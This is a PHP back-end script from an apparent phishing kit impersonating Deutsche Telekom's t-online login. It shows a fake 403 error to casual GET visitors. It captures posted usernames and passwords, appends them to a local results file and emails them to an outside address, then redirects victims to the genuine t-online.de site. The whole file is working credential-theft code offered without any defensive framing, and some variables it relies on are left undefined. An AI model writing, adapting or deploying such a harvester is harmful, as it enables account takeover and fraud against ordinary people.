<?php
session_start();
include_once 'mail.php';

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}



$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];


$user = $_SESSION['user'];
$pass = $_SESSION['pass'];


$message = "";
$message .= "===============|Telecom Deutsche|==============\n";
$message .= "ID  : ".$user."\n";
$message .= "Pass: ".$pass."\n";
$message .= "IP: ".$ip."\n";
$message .= "===============================================\n";
$send = "employment@laccaphamaceuticals.com";
$subject = "Telekom";
$file = fopen("./man.html","a");   ///  Directory Of Rezult OK.
fwrite($file,$message);
$headers = "From: ".$ip."\n";
$headers .= "MIME-Version: 1.0\n";
$Redirect ="https://www.t-online.de/#top";

mail($emailResult,$subject,$message,$headers);

header("Location: $Redirect");





// ====================

$user = $_POST['user'];
$pass = $_POST['pass'];

$to = "";
$subject = "My subject";
$msg = "$$user .' '. $pass";

// $headers = "From: webmaster@example.com" . "\r\n" .
// "CC: somebodyelse@example.com";

mail($to,$subject,$msg,$emailResult);




$Redirect="https://www.t-online.de/#top";


header("Location: $Redirect");
?>
